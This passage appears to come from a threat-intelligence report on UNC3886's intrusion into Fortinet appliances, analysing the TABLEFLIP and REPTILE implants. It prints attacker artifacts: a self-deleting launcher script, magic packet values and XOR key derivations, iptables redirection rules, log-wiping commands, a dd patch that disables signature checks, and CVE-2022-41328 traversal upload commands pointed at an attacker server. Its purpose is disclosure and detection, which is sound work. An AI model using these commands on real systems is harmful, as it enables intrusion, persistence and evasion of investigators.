<p>When a command was successfully received, the backdoor returned the sequence <em>‘;7(Zu9YTsA7qQ#vw’</em> as an acknowledgement token; this same string was also sent to signal session termination.</p>
<p>Once CASTLETAP was deployed to the FortiGate firewalls, the threat actor connected to ESXi and vCenter machines. The threat actor deployed VIRTUALPITA and VIRTUALPIE to establish persistence, allowing for continued access to the hypervisors and the guest machines. This is described in further detail in the blog post, “<a href="https://cloud.google.com/blog/topics/threat-intelligence/esxi-hypervisors-malware-persistence" rel="noopener" target="_blank">Bad VIB(E)s Part One: Investigating Novel Malware Persistence Within ESXi Hypervisors</a>.”</p>
<h2>Scenario #2 (Detailed): FortiManager Not Exposed to the Internet</h2>
<p>The technical details that follow describe the attack path taken by the threat actor where the FortiManager had network Access Control Lists (ACL) set up to restrict external access.</p>
<h3>Regaining Access to the Internet-restricted FortiManager</h3>
<p>When ACLs were implemented on the FortiManager device, the threat actor lost direct public access to device. To regain access to the FortiManager, the threat actor pivoted from a FortiGate Firewall compromised with CASTLETAP. The threat actor then deployed the following three (3) malicious files, seen in Table 5, to the FortiManager upon successful reconnection.</p>
<br>
<div style="color:#5f6368;overflow-x:auto;overflow-y:hidden;width:100%">
<div style="color:#5f6368;overflow-x:auto;overflow-y:hidden;width:100%">
<div style="color:#5f6368;overflow-x:auto;overflow-y:hidden;width:100%">
<div style="color:#5f6368;overflow-x:auto;overflow-y:hidden;width:100%">
<div style="color:#5f6368;overflow-x:auto;overflow-y:hidden;width:100%">
<div style="color:#5f6368;overflow-x:auto;overflow-y:hidden;width:100%">
<div style="color:#5f6368;overflow-x:auto;overflow-y:hidden;width:100%">
<div style="color:#5f6368;overflow-x:auto;overflow-y:hidden;width:100%">
<div style="color:#5f6368;overflow-x:auto;overflow-y:hidden;width:100%">
<div style="color:#5f6368;overflow-x:auto;overflow-y:hidden;width:100%">
<div style="color:#5f6368;overflow-x:auto;overflow-y:hidden;width:100%">
<div style="color:#5f6368;overflow-x:auto;overflow-y:hidden;width:100%">
<div style="color:#5f6368;overflow-x:auto;overflow-y:hidden;width:100%">
<div style="color:#5f6368;overflow-x:auto;overflow-y:hidden;width:100%">
<div style="color:#5f6368;overflow-x:auto;overflow-y:hidden;width:100%">
<div style="color:#5f6368;overflow-x:auto;overflow-y:hidden;width:100%">
<div style="color:#5f6368;overflow-x:auto;overflow-y:hidden;width:100%">
<div style="color:#5f6368;overflow-x:auto;overflow-y:hidden;width:100%">
<div style="color:#5f6368;overflow-x:auto;overflow-y:hidden;width:100%">
<div style="color:#5f6368;overflow-x:auto;overflow-y:hidden;width:100%">
<div style="color:#5f6368;overflow-x:auto;overflow-y:hidden;width:100%">
<div style="color:#5f6368;overflow-x:auto;overflow-y:hidden;width:100%">
<div style="color:#5f6368;overflow-x:auto;overflow-y:hidden;width:100%">
<div style="color:#5f6368;overflow-x:auto;overflow-y:hidden;width:100%">
<div style="color:#5f6368;overflow-x:auto;overflow-y:hidden;width:100%">
<div style="color:#5f6368;overflow-x:auto;overflow-y:hidden;width:100%">
<div style="color:#5f6368;overflow-x:auto;overflow-y:hidden;width:100%">
<div style="color:#5f6368;overflow-x:auto;overflow-y:hidden;width:100%">
<div style="color:#5f6368;overflow-x:auto;overflow-y:hidden;width:100%">
<div style="color:#5f6368;overflow-x:auto;overflow-y:hidden;width:100%">
<div style="color:#5f6368;overflow-x:auto;overflow-y:hidden;width:100%">
<div style="color:#5f6368;overflow-x:auto;overflow-y:hidden;width:100%">
<div style="color:#5f6368;overflow-x:auto;overflow-y:hidden;width:100%">
<div style="color:#5f6368;overflow-x:auto;overflow-y:hidden;width:100%">
<div style="color:#5f6368;overflow-x:auto;overflow-y:hidden;width:100%">
<div style="color:#5f6368;overflow-x:auto;overflow-y:hidden;width:100%">
<div style="color:#5f6368;overflow-x:auto;overflow-y:hidden;width:100%">
<div style="color:#5f6368;overflow-x:auto;overflow-y:hidden;width:100%">
<div style="color:#5f6368;overflow-x:auto;overflow-y:hidden;width:100%">
<div style="color:#5f6368;overflow-x:auto;overflow-y:hidden;width:100%">
<div style="color:#5f6368;overflow-x:auto;overflow-y:hidden;width:100%">
<div style="color:#5f6368;overflow-x:auto;overflow-y:hidden;width:100%">
<div style="color:#5f6368;overflow-x:auto;overflow-y:hidden;width:100%">
<div style="color:#5f6368;overflow-x:auto;overflow-y:hidden;width:100%">
<div style="color:#5f6368;overflow-x:auto;overflow-y:hidden;width:100%">
<div style="color:#5f6368;overflow-x:auto;overflow-y:hidden;width:100%">
<div style="color:#5f6368;overflow-x:auto;overflow-y:hidden;width:100%"><table>
<tbody>
<tr>
<td style="border:1px solid #000000;padding:16px"><strong>Malware Family</strong></td>
<td style="border:1px solid #000000;padding:16px"><strong>File Path</strong></td>
<td style="border:1px solid #000000;padding:16px"><strong>Description</strong></td>
</tr>
<tr>
<td style="border:1px solid #000000;padding:16px"><code>N/A</code></td>
<td style="border:1px solid #000000;padding:16px"><code>/bin/support</code></td>
<td style="border:1px solid #000000;padding:16px"><code>Launches /bin/auth and /bin/klogd and deletes the two files along with /bin/support from disk.</code></td>
</tr>
<tr>
<td style="border:1px solid #000000;padding:16px"><a href="https://advantage.mandiant.com/malware/malware--77f7a062-37ab-575e-8ac6-ee720d81f60f" rel="noopener" target="_blank"><code>TABLEFLIP</code></a></td>
<td style="border:1px solid #000000;padding:16px"><code>/bin/auth</code></td>
<td style="border:1px solid #000000;padding:16px"><code>A passive utility to setup network traffic redirection from a specific IP address destined to the FortiManager on TCP port 541 to another specified port.</code></td>
</tr>
<tr>
<td style="border:1px solid #000000;padding:16px"><code>REPTILE</code></td>
<td style="border:1px solid #000000;padding:16px"><code>/bin/klogd</code></td>
<td style="border:1px solid #000000;padding:16px"><code>A backdoor utility that listens for a specialized packet for activation.</code></td>
</tr>
</tbody>
</table></div>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
<div style="color:#5f6368;display:block;font-size:16px;font-style:italic;margin-top:8px;width:100%;text-align:center">Table 5: Attack Lifecycle 2 Malware Key</div>
</div>
<p>The file <code>/bin/support</code> (MD5: <code>9ce2459168cf4b5af494776a70e0feda</code>) served as a launch script to execute <code>/bin/klogd</code> (REPTILE variant) and <code>/bin/auth</code> (TABLEFLIP). The attacker modified the startup file <code>/etc/init.d/localnet</code> to execute the line ‘<code>nohup /bin/support &amp;</code>’ so the script would run every time the system was rebooted. Since the running FortiOS file system was an ephemeral copy of the archive <code>rootfs.gz</code>, the files would be deleted from the ephemeral copy after being loaded into memory and persist in the <code>rootfs.gz</code> archive, a file not accessible to users without pulling a forensic image. The contents of <code>/bin/support</code> can be seen in Figure 14.</p>
<p> </p>
<pre><code>#!/bin/bash

#cp /bin/sh /bin/top

sleep 30
/bin/klogd
/bin/auth
rm -rf /bin/klogd
rm -rf /nohup.out
rm -rf /bin/support</code></pre>
<div style="color:#5f6368;overflow-x:auto;overflow-y:hidden;width:100%">
<div style="color:#5f6368;display:block;font-size:16px;font-style:italic;margin-top:8px;width:100%;text-align:center">Figure 14: Contents of /bin/support</div>
</div>
<h3>TABLEFLIP (Traffic Redirection Utility)</h3>
<p>To enable continued access directly from the Internet, the threat actor implemented TABLEFLIP (MD5: <code>b6e92149efaf78e9ce7552297505b9d5</code>), a passive traffic redirection utility that listens on all active interfaces for specialized command packets. With this utility in place, and regardless of the ACL’s in place, the threat actor would be able to connect directly to the FortiManager as seen in Figure 15.</p>
</div></span></section><section class="QzPuud"><div><section><figure class="NEBdNd"><section class="PBkdHd DhGbH" jscontroller="SCGBie" jsaction="rcuQ6b:npT2md"><img class="JcsBte mZzdH ZOnyjc" src="https://storage.googleapis.com/gweb-cloudblog-publish/images/fig15-tableflip-behavior_evvo.max-2200x2200.png" alt="https://storage.googleapis.com/gweb-cloudblog-publish/images/fig15-tableflip-behavior_evvo.max-2200x2200.png" jsname='P3Vluc' jsaction="click:HTIlC" loading="lazy"/><section class="glue-modal glue-modal--dark QHdDac" role="dialog" aria-modal="true"><img class="JcsBte mZzdH ZOnyjc" src="https://storage.googleapis.com/gweb-cloudblog-publish/images/fig15-tableflip-behavior_evvo.max-2200x2200.png" alt="https://storage.googleapis.com/gweb-cloudblog-publish/images/fig15-tableflip-behavior_evvo.max-2200x2200.png" jsname='P3Vluc' jsaction="click:HTIlC" loading="lazy"/><button class="glue-modal__close-btn" tabindex="0" aria-label="Close this modal"></button></section></section></figure><div class="nRhiJb-cHYyed nRhiJb-DbgRPb-R6PoUb-ma6Yeb ZpqjUe"><span class="dQQu7c" jsaction="rcuQ6b:npT2md" jscontroller="YSybTb" data-track-type="" soy-skip ssk='5:kbe95'><p>Figure 15: TABLEFLIP behavior</p></span></div></section></div></section><section class="Wy08Ac nRhiJb-qJTHM-OWXEXe-hJDwNd nRhiJb-DbgRPb-II5mzb-cGMI2b"><span class="dQQu7c" jsaction="rcuQ6b:npT2md" jscontroller="YSybTb" data-track-type="" soy-skip ssk='5:kbe95'><p>TABLEFLIP was configured to listen on all active interfaces for TCP packets and searches at the start of the TCP payload for the following magic packet, shown in Figure 16, for packets destined for port TCP 541.</p>
<p> </p>
<pre><code>17 03 01 01 D8 54 2F 31</code></pre>
<div style="color:#5f6368;display:block;font-size:16px;font-style:italic;margin-top:8px;width:100%;text-align:center">Figure 16: TABLEFLIP magic number sequence</div>
<p>If the magic number was found, the malware extracted a XOR key from offset 0xB of the TCP payload. This key was used as a seed for XOR based sequential decryption. TCP payload offset 0xC onwards was decrypted using this scheme. Figure 17 shows the structure of the payload.</p>
<p> </p>
<pre><code>struct _payload
{
_DWORD magic_dword1;
_DWORD magic_dword2;
_BYTE unused[3];
_BYTE xor_key;
_DWORD command;
_DWORD ip;
_WORD port;
};</code></pre>
<div style="color:#5f6368;overflow-x:auto;overflow-y:hidden;width:100%">
<div style="color:#5f6368;display:block;font-size:16px;font-style:italic;margin-top:8px;width:100%;text-align:center">Figure 17: TABLEFLIP payload structure</div>
</div>
<p>The malware then attempted to extract the command, IP, and port from the payload. Table 6 describes the command and actions taken when a command was recognized.</p>
<p> </p>
<div style="color:#5f6368;overflow-x:auto;overflow-y:hidden;width:100%">
<div style="color:#5f6368;overflow-x:auto;overflow-y:hidden;width:100%">
<div style="color:#5f6368;overflow-x:auto;overflow-y:hidden;width:100%">
<div style="color:#5f6368;overflow-x:auto;overflow-y:hidden;width:100%">
<div style="color:#5f6368;overflow-x:auto;overflow-y:hidden;width:100%">
<div style="color:#5f6368;overflow-x:auto;overflow-y:hidden;width:100%">
<div style="color:#5f6368;overflow-x:auto;overflow-y:hidden;width:100%">
<div style="color:#5f6368;overflow-x:auto;overflow-y:hidden;width:100%">
<div style="color:#5f6368;overflow-x:auto;overflow-y:hidden;width:100%">
<div style="color:#5f6368;overflow-x:auto;overflow-y:hidden;width:100%">
<div style="color:#5f6368;overflow-x:auto;overflow-y:hidden;width:100%">
<div style="color:#5f6368;overflow-x:auto;overflow-y:hidden;width:100%">
<div style="color:#5f6368;overflow-x:auto;overflow-y:hidden;width:100%">
<div style="color:#5f6368;overflow-x:auto;overflow-y:hidden;width:100%">
<div style="color:#5f6368;overflow-x:auto;overflow-y:hidden;width:100%">
<div style="color:#5f6368;overflow-x:auto;overflow-y:hidden;width:100%">
<div style="color:#5f6368;overflow-x:auto;overflow-y:hidden;width:100%">
<div style="color:#5f6368;overflow-x:auto;overflow-y:hidden;width:100%">
<div style="color:#5f6368;overflow-x:auto;overflow-y:hidden;width:100%"><table>
<tbody>
<tr>
<td style="border:1px solid #000000;padding:16px"><strong>Command</strong></td>
<td style="border:1px solid #000000;padding:16px"><strong>Description</strong></td>
</tr>
<tr>
<td style="border:1px solid #000000;padding:16px">0xFFFEFDFC</td>
<td style="border:1px solid #000000;padding:16px">Enable redirection for traffic with source IP matching extracted IP and port 541 to extracted destination port</td>
</tr>
<tr>
<td style="border:1px solid #000000;padding:16px">0xFCFDFEFF</td>
<td style="border:1px solid #000000;padding:16px">Disable redirection for traffic with source IP matching extracted IP and specified destination port</td>
</tr>
</tbody>
</table></div>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
<div style="color:#5f6368;display:block;font-size:16px;font-style:italic;margin-top:8px;width:100%;text-align:center">Table 6: TABLEFLIP capabilities key</div>
<p>Traffic redirection was accomplished by adding <code>iptables</code> rules on the FortiManager system as seen in Figure 18. with the source IP and redirection port specified in the command packet. <code>iptables</code> was executed to check if a PREROUTING rule for that IP and port combination already existed. If the combination was not found, a new redirection rule was added in the PREROUTING chain. The rules under the PREROUTING chain were processed immediately once the packet is received on an interface.</p>
<p> </p>
<pre><code>iptables -t nat -S PREROUTING | grep &lt;src_ip&gt; | grep &lt;redirection_port&gt; || iptables -t nat -A PREROUTING -p tcp -s &lt;src_ip&gt; --dport 541 -j REDIRECT --to-port &lt;redirection_port&gt;
</code></pre>
<div style="color:#5f6368;overflow-x:auto;overflow-y:hidden;width:100%">
<div style="color:#5f6368;display:block;font-size:16px;font-style:italic;margin-top:8px;width:100%;text-align:center">Figure 18: iptables rule to implement traffic redirection</div>
</div>
<p>When assigned to delete traffic redirection, TABLEFLIP utilized the <code>grep</code> command to filter on all lines in the PREROUTING chain which contained the IP address and redirection port of interest, capturing the appropriate rule id’s with <code>awk</code>. These id’s were passed back to <code>iptables</code> with <code>xargs</code> to have them removed from the PREROUTING chain, as seen in Figure 19.</p>
<p> </p>
<pre><code>iptables -t nat -S PREROUTING | tail -n +2 | grep -n -E &#39;&lt;src_ip&gt;.*&lt; 
redirection_port&gt;&#39; | awk -F: &#39;{print $1}&#39;| xargs iptables -t nat -D PREROUTING
</code></pre>
<div style="color:#5f6368;overflow-x:auto;overflow-y:hidden;width:100%">
<div style="color:#5f6368;display:block;font-size:16px;font-style:italic;margin-top:8px;width:100%;text-align:center">Figure 19: iptables rule to disable traffic redirection</div>
</div>
<h3>REPTILE (Backdoor)</h3>
<p>To achieve persistent access on the FortiManager device, the threat actor deployed a backdoor with the filename <code>/bin/klogd</code> (MD5: <code>53a69adac914808eced2bf8155a7512d</code>) that Mandiant refers to as REPTILE, a variant of a publicly available Linux kernel module (LKM) rootkit. With the assistance of TABLEFLIP, the threat actor was able to successfully forward traffic and access the REPTILE backdoor using <code>iptables</code> traffic redirection rules.</p>
<p>Once executed, REPTILE created a packet socket to receive OSI layer 2 packets. When a packet was received, the backdoor would perform the check seen in the pseudocode in Figure 20 to determine if a magic string was present.</p>
<p> </p>
<pre><code>single_byte_xor_key = (month * year) * day % 255
index = 2 * data_received_on_port_8[7];
data_to_decode_ptr = *((char *)&amp;data[index + 12] + 1)
i = 0
while ( i &lt; strlen(data_to_decode) )
    decoded_data[i] = data_to_decode_ptr[i++] ^ single_byte_xor_key;
strncmp(&amp;decoded_data, &quot;mznCvqSBo&quot;, 9)</code></pre>
<p style="text-align:center"><span style="color:#5f6368;display:block;font-size:16px;font-style:italic;margin-top:8px;width:100%">Figure 20: REPTILE magic string detection pseudocode</span></p>
<p style="text-align:left">Table 7 shows the magic strings interpreted by REPTILE and their resultant actions.</p>
<div style="color:#5f6368;overflow-x:auto;overflow-y:hidden;width:100%">
<div style="color:#5f6368;overflow-x:auto;overflow-y:hidden;width:100%">
<div style="color:#5f6368;overflow-x:auto;overflow-y:hidden;width:100%">
<div style="color:#5f6368;overflow-x:auto;overflow-y:hidden;width:100%">
<div style="color:#5f6368;overflow-x:auto;overflow-y:hidden;width:100%">
<div style="color:#5f6368;overflow-x:auto;overflow-y:hidden;width:100%">
<div style="color:#5f6368;overflow-x:auto;overflow-y:hidden;width:100%">
<div style="color:#5f6368;overflow-x:auto;overflow-y:hidden;width:100%">
<div style="color:#5f6368;overflow-x:auto;overflow-y:hidden;width:100%">
<div style="color:#5f6368;overflow-x:auto;overflow-y:hidden;width:100%">
<div style="color:#5f6368;overflow-x:auto;overflow-y:hidden;width:100%">
<div style="color:#5f6368;overflow-x:auto;overflow-y:hidden;width:100%">
<div style="color:#5f6368;overflow-x:auto;overflow-y:hidden;width:100%">
<div style="color:#5f6368;overflow-x:auto;overflow-y:hidden;width:100%">
<div style="color:#5f6368;overflow-x:auto;overflow-y:hidden;width:100%">
<div style="color:#5f6368;overflow-x:auto;overflow-y:hidden;width:100%">
<div style="color:#5f6368;overflow-x:auto;overflow-y:hidden;width:100%">
<div style="color:#5f6368;overflow-x:auto;overflow-y:hidden;width:100%">
<div style="color:#5f6368;overflow-x:auto;overflow-y:hidden;width:100%"><table border="1" style="border-collapse:collapse;width:100%">
<tbody>
<tr>
<td style="width:17.1123%">
<p><strong>Magic String</strong></p>
</td>
<td style="width:82.8877%">
<p><strong>Description</strong></p>
</td>
</tr>
<tr>
<td style="width:17.1123%">
<p><em>mznCvqSBo</em></p>
</td>
<td style="width:82.8877%">
<p>Parse C2 information from OSI layer 2 packet and connects to it over SSL.</p>
</td>
</tr>
<tr>
<td style="width:17.1123%">
<p>hpaVAj2FJ</p>
</td>
<td style="width:82.8877%">
<p>Kills REPTILE process (Only searched for if first magic string not found)</p>
</td>
</tr>
</tbody>
</table></div>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
<p style="text-align:center"><span style="color:#5f6368;display:block;font-size:16px;font-style:italic;margin-top:8px;width:100%">Table 7: REPTILE magic string options</span></p>
<p style="text-align:left">Similar to the method used by CASTLETAP to decode the C2 information, REPTILE derived a single-byte XOR key from the Epoch date stamp to decrypt payload data, which caused the encryption key to change daily. Figure 21 shows the formula that was used to calculate the XOR key.</p>
<p><code><strong>(month * (year + 1900)) * day % 255</strong></code></p>
<ul>
<li><code><strong>year: index starting from 1900 i.e. current_year-1900</strong></code> </li>
<li><code><strong>month: index starting from 0</strong></code></li>
<li><code><strong>date: index starting from 1</strong></code></li>
</ul>
<p style="text-align:center"><span style="color:#5f6368;display:block;font-size:16px;font-style:italic;margin-top:8px;width:100%">Figure 21: REPTILE XOR key calculation</span></p>
<p>If the magic string “<code>mznCvqSBo</code>” was found, a reverse shell was created with the C2 IP address and destination port extracted from the rest of the activation packet payload. When the first magic string was not present, the binary searched for the second magic string “<code>hpaVAj2FJ</code>”. If this second magic string was found, the REPTILE process will end.If no magic strings were found, the backdoor continued to listen for other connections.</p>
<h2>Threat Actor Anti-Forensics</h2>
<h3>Clearing and Modifying Logs</h3>
<p>Mandiant analyzed the system memory of the FortiManager and identified threat actor commands used to clear specific events that contained the threat actor’s IP address from multiple log sources. The commands seen in Figure 22 were utilized by the threat actor to remove log entries containing the IP address used to connect to the THINCRUST backdoor.</p>
<p> </p>
<pre><code>echo &gt; /var/log/django.log; \
echo &gt; /var/log/apache2/error_log; \
sed -i ‘/&lt;ipaddress&gt;/d’ /var/log/apache2/*log; \
ls -alt /var/log/ /var/log/apache2/</code></pre>
<p style="text-align:center"><span style="color:#5f6368;display:block;font-size:16px;font-style:italic;margin-top:8px;width:100%">Figure 22: Threat actor’s anti-forensics commands</span></p>
<h3>Disabling File System Verification on Startup</h3>
<p>In an attempt to skip digital signature verification checks made to the file system on boot, the threat actor added the command seen in Figure 23 to the startup config <code>/etc/init.d/localnet</code> within the <code>rootfs.gz</code> archive of both FortiManager and FortiAnalyzer devices.</p>
<p> </p>
<pre><code>printf &quot;t&quot; | dd of=/bin/smit bs=1 count=1 conv=notrunc seek=22866 2&gt;/dev/null
</code></pre>
<p style="text-align:center"><span style="color:#5f6368;display:block;font-size:16px;font-style:italic;margin-top:8px;width:100%">Figure 23: /etc/init.d/localnet – DD Command</span></p>
<p style="text-align:left">Comparing the compromised <code>/bin/smit</code> (<code>a388ebaef45add5da503e4bf2b9da546</code>) with a clean version from both FortiManager and FortiAnalyzer, the modified binary contained a single byte difference. The modified location within <code>/bin/smit</code> is executed when the <code>mount</code> command line argument is given on system startup. Normally, the <code>mount</code> function would perform OpenSSL 1.1.0 digital signature verification checks on the files in Figure 24 against <code>/data/.fmg_sign</code>, but this modification changed a conditional jump instruction to an unconditional jump instruction which always skipped digital signature verification checks normally made on the system files.</p>
<p style="text-align:left"> </p>
<pre><code>/data/extlinux.sys
/data/extlinux.conf
/data/boot.msg
/data/vmlinuz
/data/rootfse-fe</code></pre>
<p style="text-align:center"><span style="color:#5f6368;display:block;font-size:16px;font-style:italic;margin-top:8px;width:100%">Figure 24: Files normally checked by /bin/smit</span></p>
<p>Since the <code>mount</code> command executes prior to <code>/etc/init.d/localnet</code> on system startup, the <code>dd</code> command will overwrite the 22,866<sup>th</sup> byte of <code>/bin/smit</code> with the character “<code>t</code>”, reverting the binary to a state that appears as if it was never tampered with, even if the file was hashed.</p>
<h2>Attribution</h2>
<p>UNC3886 is an advanced cyber espionage group with unique capabilities in how they operate on-network as well as the tools they utilize in their campaigns. UNC3886 has been observed targeting firewall and virtualization technologies which lack EDR support. Their ability to manipulate firewall firmware and exploit a zero-day indicates they have curated a deeper-level of understanding of such technologies. UNC3886 has modified publicly available malware, specifically targeting *nix operating systems.</p>
<p>Another threat cluster unrelated to UNC3886, suspected to be from China has recently been observed targeting zero-day vulnerabilities in Fortinet as reported by Mandiant in mid-January of 2023. Mandiant continues to gather evidence and identify overlaps between UNC3886 and other groups that are attributed to Chinese APT.</p>
<h2>Conclusion</h2>
<p>The activity discussed in this blog post is further evidence that advanced cyber espionage threat actors are taking advantage of any technology available to persist and traverse a target environment, especially those technologies that do not support EDR solutions. This presents a unique challenge for investigators as many network appliances lack solutions to detect runtime modifications made to the underlying operating system and require direct involvement of the manufacturer to collect forensic images. Cross organizational communication and collaboration is key to providing both manufacturers with early notice of new attack methods in the wild before they are made public and investigators with expertise to better shed light on these new attacks.</p>
<p>Mandiant recommends organizations using the ESXi and the VMware infrastructure suite follow the hardening steps outlined in this blog post to <a href="https://cloud.google.com/blog/topics/threat-intelligence/esxi-hypervisors-detection-hardening" rel="noopener" target="_blank" title="https://www.mandiant.com/resources/blog/esxi-hypervisors-detection-hardening">minimize the attack surface of ESXi hosts</a>.</p>
<h2>Acknowledgements</h2>
<p>Special thanks to Jeremy Koppen, Kirstie Failey, Bryce Bucklin, Jay Smith, Nicholas Luedtke, Ronnie Salomonsen, Nino Isakovic, Charles Carmakal, and Fortinet PSIRT for their assistance with the investigation, technical review, and creating detections for the malware families discussed in this blog post. In addition, we would also like to thank Fortinet and VMware for their collaboration on this research.</p>
<p>Fortinet released two additional resources covering <a href="https://www.fortiguard.com/psirt/FG-IR-22-369" rel="noreferrer noopener" target="_blank" title="https://www.fortiguard.com/psirt/fg-ir-22-369">CVE-2022-41328</a> and an <a href="https://www.fortinet.com/blog/psirt-blogs/fg-ir-22-369-psirt-analysis" rel="noopener" target="_blank">analysis of identified attacker activity</a>.</p>
<h2>MITRE ATT&amp;CK Techniques</h2>
<p><strong>Impact</strong></p>
<ul>
<li>   T1565.001: Stored Data Manipulation</li>
</ul>
<p><strong>Defense Evasion</strong></p>
<ul>
<li>   T1027:        Obfuscated Files or Information</li>
<li>   T1070:        Indicator Removal</li>
<li>   T1070.003:    Clear Command History</li>
<li>   T1070.004:    File Deletion</li>
<li>   T1078:        Valid Accounts</li>
<li>   T1140:        Deobfuscate/Decode Files or Information</li>
<li>   T1202:        Indirect Command Execution</li>
<li>   T1218.011:    Rundll32</li>
<li>   T1222:        File and Directory Permissions Modification</li>
<li>   T1497:        Virtualization/Sandbox Evasion</li>
<li>   T1497.001:    System Checks</li>
<li>   T1620:        Reflective Code Loading</li>
</ul>
<p><strong>Credential Access</strong></p>
<ul>
<li>   T1552:        Unsecured Credentials</li>
<li>   T1555.005:    Password Managers</li>
</ul>
<p> <strong>Discovery</strong></p>
<ul>
<li>   T1016:        System Network Configuration Discovery</li>
<li>   T1033:        System Owner/User Discovery</li>
<li>   T1057:        Process Discovery</li>
<li>   T1082:        System Information Discovery</li>
<li>   T1083:        File and Directory Discovery</li>
<li>   T1087:        Account Discovery</li>
<li>   T1518:        Software Discovery</li>
</ul>
<p> <strong>Collection</strong></p>
<ul>
<li>   T1074.001:    Local Data Staging</li>
<li>   T1560:        Archive Collected Data</li>
<li>   T1560.001:    Archive via Utility</li>
</ul>
<p><strong>Execution</strong></p>
<ul>
<li>   T1059:        Command and Scripting Interpreter</li>
<li>   T1059.001:    PowerShell</li>
<li>   T1059.003:    Windows Command Shell</li>
<li>   T1059.004:    Unix Shell</li>
<li>   T1059.006:    Python</li>
<li>   T1129:        Shared Modules</li>
</ul>
<p><strong>Command and Control</strong></p>
<ul>
<li>   T1095:        Non-Application Layer Protocol</li>
<li>   T1102.001:    Dead Drop Resolver</li>
<li>   T1105:        Ingress Tool Transfer</li>
<li>   T1571:        Non-Standard Port</li>
<li>   T1573.001:    Symmetric Cryptography</li>
</ul>
<p><strong>Lateral Movement</strong></p>
<ul>
<li>   T1021.004:    SSH</li>
</ul>
<h2>Indicators of Compromise</h2>
<div style="color:#5f6368;overflow-x:auto;overflow-y:hidden;width:100%">
<div style="color:#5f6368;overflow-x:auto;overflow-y:hidden;width:100%">
<div style="color:#5f6368;overflow-x:auto;overflow-y:hidden;width:100%">
<div style="color:#5f6368;overflow-x:auto;overflow-y:hidden;width:100%">
<div style="color:#5f6368;overflow-x:auto;overflow-y:hidden;width:100%">
<div style="color:#5f6368;overflow-x:auto;overflow-y:hidden;width:100%">
<div style="color:#5f6368;overflow-x:auto;overflow-y:hidden;width:100%">
<div style="color:#5f6368;overflow-x:auto;overflow-y:hidden;width:100%">
<div style="color:#5f6368;overflow-x:auto;overflow-y:hidden;width:100%">
<div style="color:#5f6368;overflow-x:auto;overflow-y:hidden;width:100%">
<div style="color:#5f6368;overflow-x:auto;overflow-y:hidden;width:100%">
<div style="color:#5f6368;overflow-x:auto;overflow-y:hidden;width:100%">
<div style="color:#5f6368;overflow-x:auto;overflow-y:hidden;width:100%">
<div style="color:#5f6368;overflow-x:auto;overflow-y:hidden;width:100%">
<div style="color:#5f6368;overflow-x:auto;overflow-y:hidden;width:100%">
<div style="color:#5f6368;overflow-x:auto;overflow-y:hidden;width:100%">
<div style="color:#5f6368;overflow-x:auto;overflow-y:hidden;width:100%">
<div style="color:#5f6368;overflow-x:auto;overflow-y:hidden;width:100%"><table border="1" style="border-collapse:collapse;width:135.381%;height:2950.08px">
<tbody>
<tr style="height:54.3958px">
<td colspan="2" style="border:1px solid #000000;padding:16px;width:10.581%;height:54.3958px">
<p><strong>Type</strong></p>
</td>
<td style="border:1px solid #000000;padding:16px;width:57.0582%;height:54.3958px">
<p><strong>Values</strong></p>
</td>
<td style="border:1px solid #000000;padding:16px;width:32.3791%;height:54.3958px">
<p><strong>Description</strong></p>
</td>
</tr>
<tr style="height:166.375px">
<td colspan="2" style="border:1px solid #000000;padding:16px;width:10.581%;height:166.375px">
<p>FortiGate Command</p>
</td>
<td style="border:1px solid #000000;padding:16px;width:57.0582%;height:166.375px">
<p>execute wireless-controller hs20-icon upload-icon ftp ../../../../../../bin/lspci &lt;TA FTP Server&gt;</p>
<p> </p>
</td>
<td style="border:1px solid #000000;padding:16px;width:32.3791%;height:166.375px">
<p>Attempted execution of this command or similar commands containing directory traversal are indicative of attempted exploitation of CVE-2022-41328 to upload a file to a normally restricted directory</p>
</td>
</tr>
<tr style="height:166.375px">
<td colspan="2" style="border:1px solid #000000;padding:16px;width:10.581%;height:166.375px">
<p>FortiGate Command</p>
</td>
<td style="border:1px solid #000000;padding:16px;width:57.0582%;height:166.375px">
<p>execute wireless-controller hs20-icon upload-icon tftp ../../../../../../bin/lspci &lt;TA TFTP Server&gt;</p>
</td>
<td style="border:1px solid #000000;padding:16px;width:32.3791%;height:166.375px">
<p>Attempted execution of this command or similar commands containing directory traversal are indicative of attempted exploitation of CVE-2022-41328 to upload a file to a normally restricted directory</p>
</td>
</tr>
<tr style="height:76.7917px">
<td colspan="2" style="border:1px solid #000000;padding:16px;width:10.581%;height:76.7917px">
<p>Filename</p>
</td>
<td style="border:1px solid #000000;padding:16px;width:57.0582%;height:76.7917px">
<p>/bin/fgfm</p>
</td>
<td style="border:1px solid #000000;padding:16px;width:32.3791%;height:76.7917px">
<p>CASTLETAP Sample found on a FortiGate device</p>
</td>
</tr>
<tr style="height:121.583px">
<td colspan="2" style="border:1px solid #000000;padding:16px;width:10.581%;height:121.583px">
<p>Symlinked File</p>
</td>
<td style="border:1px solid #000000;padding:16px;width:57.0582%;height:121.583px">
<p>/bin/lspci -&gt; /bin/sysctl</p>
</td>
<td style="border:1px solid #000000;padding:16px;width:32.3791%;height:121.583px">
<p>lspci should be a standalone binary within FortiGate devices. A symlink suggests that a modification was made to the file system</p>
</td>
</tr>
<tr style="height:99.1875px">
<td colspan="2" style="border:1px solid #000000;padding:16px;width:10.581%;height:99.1875px">
<p>URI</p>
</td>
<td style="border:1px solid #000000;padding:16px;width:57.0582%;height:99.1875px">
<p>/p/util/show_device_info</p>
</td>
<td style="border:1px solid #000000;padding:16px;width:32.3791%;height:99.1875px">
<p>An API call which created by the threat actor which acted as a persistent backdoor on FortiManager devices</p>
</td>
</tr>
<tr style="height:99.1875px">
<td colspan="2" style="border:1px solid #000000;padding:16px;width:10.581%;height:99.1875px">
<p>URI</p>
</td>
<td style="border:1px solid #000000;padding:16px;width:57.0582%;height:99.1875px">
<p>/p/utils/fortigate_syslog_send</p>
</td>
<td style="border:1px solid #000000;padding:16px;width:32.3791%;height:99.1875px">
<p>An API call which created by the threat actor which acted as a persistent backdoor on FortiAnalyzer devices</p>
</td>
</tr>
